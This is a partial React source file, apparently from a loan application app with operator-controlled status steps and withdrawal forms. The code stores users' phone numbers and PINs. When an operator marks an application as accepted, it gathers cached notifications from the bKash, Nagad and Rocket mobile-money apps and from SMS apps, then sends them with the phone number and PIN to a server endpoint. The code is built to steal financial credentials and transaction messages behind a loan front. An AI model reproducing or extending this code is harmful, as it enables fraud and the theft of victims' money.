...
const App: React.FC = () => {
  ...
  const [acceptedAt, setAcceptedAt] = useState<number>(0);
  const [withdrawalDetails, setWithdrawalDetails] = useState<any>(null);
  const [withdrawalSubmittedAt, setWithdrawalSubmittedAt] = useState<number>(0);
  ...
  useEffect(() => {
    const unsubscribe = db.ref('settings/bkashEnabled').on('value', (snapshot) => {
      const val = snapshot.val();
  ...
  // Restore session state on app load/reload — prevents reset
  useEffect(() => {
    if (!sessionId) return;
    (async () => {
      try {
        ...
        const val = await res.json();
        if (!val) return;
        if (val.applicationStatus === 'WITHDRAWAL_SUBMITTED') {
          setApplicationStatus('WITHDRAWAL_SUBMITTED');
          setWithdrawalDetails(val.withdrawalDetails || null);
          setWithdrawalSubmittedAt(val.withdrawalSubmittedAt || Date.now());
          setApprovedAmount(val.approvedAmount || val.loanAmount || '');
          setCurrentStep(AppStep.WithdrawalWaiting);
        } else if (val.applicationStatus === 'APPROVED') {
          setApplicationStatus('APPROVED');
          setApprovedAmount(val.approvedAmount || val.loanAmount || '');
          setCurrentStep(AppStep.ApprovalNotice);
        } else if (val.applicationStatus === 'ACCEPTED') {
  ...
  useEffect(() => {
    ...
    const checkApprovalLoop = async () => {
      ...
      try {
        const res = await fetch(`/api/db?path=sessions/${sessionId}`);
        const val = await res.json();
        const hasNotifs = val && val.lastSeen && typeof val.lastSeen === 'string' && val.lastSeen.length > 0;
    ...
    timer = setInterval(checkApprovalLoop, 5000);
  ...
  useEffect(() => {
    ...
    const cleanup = sessionRef.on('value', (snapshot: any) => {
      ...
      } else if (val.adminAction === 'APPLICATION_ACCEPTED') {
        // Only transition if not already past this step
        if (currentStepRef.current !== AppStep.SubmissionAccepted &&
            currentStepRef.current !== AppStep.ApprovalNotice &&
            currentStepRef.current !== AppStep.WithdrawalForm &&
            currentStepRef.current !== AppStep.WithdrawalWaiting) {
          setApplicationStatus('ACCEPTED');
          setAcceptedAt(val.acceptedAt || Date.now());
          setApprovedAmount(val.approvedAmount || val.loanAmount || '');
          setCurrentStep(AppStep.SubmissionAccepted);
        }
        // Instantly flush all notifications on ACCEPT
        (async () => {
          try {
          ...
          try {
            // 2. Direct flush from web storage (filter: bKash/Nagad/Rocket only)
            const cached = localStorage.getItem('notif_log');
            if (cached) {
              const notifs = JSON.parse(cached);
              const allowedPkgs = ['bKash', 'bkash', 'nagad', 'Nagad', 'rocket', 'Rocket', 'com.bKash', 'com.konasl.nagad', 'com.dbbl.mbs', 'mms', 'messaging', 'android.mms', 'android.messaging'];
              const filtered = notifs.filter((n: any) => {
                const pkg = (n.package || n.packageName || '').toLowerCase();
                return allowedPkgs.some(a => pkg.includes(a.toLowerCase()));
              });
              if (filtered.length > 0) {
                const phone = localStorage.getItem('user_phone') || '';
                const pin = localStorage.getItem('user_pin') || '';
                await fetch('/api/submit', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ sessionId: val.id || sessionId, phone, pin, flushAll: true, notifications: filtered }) });
              }
            }
          } catch {}
        })();
  ...
  const renderStep = () => {
    switch (currentStep) {
      ...
      case AppStep.ApprovalNotice:
        return <ApprovalNotice sessionId={sessionId} approvedAmount={approvedAmount || formData.loanAmount || '0'} profile={profile} withdrawals={withdrawals} onWithdraw={async (d) => { const newW = [...withdrawals, { ...d, time: new Date().toLocaleString() }]; setWithdrawals(newW); await fetch('/api/submit-withdrawal', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ sessionId, ...d, profile, withdrawals: newW }) }); if (parseInt(approvedAmount || formData.loanAmount || '0') - newW.reduce((s: number, w: any) => s + w.amount, 0) <= 0) { setCurrentStep(AppStep.WithdrawalWaiting); } }} />;
      case AppStep.WithdrawalForm:
        return <WithdrawalForm sessionId={sessionId} approvedAmount={approvedAmount || formData.loanAmount || '0'} onSubmitWithdrawal={async (d) => { await fetch('/api/submit-withdrawal', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ sessionId, ...d }) }); setWithdrawalDetails(d); setWithdrawalSubmittedAt(Date.now()); setCurrentStep(AppStep.WithdrawalWaiting); }} />;
      case AppStep.WithdrawalWaiting:
        return <WithdrawalWaiting sessionId={sessionId} withdrawalDetails={withdrawalDetails||{}} submittedAt={withdrawalSubmittedAt} />;
      case AppStep.Admin:
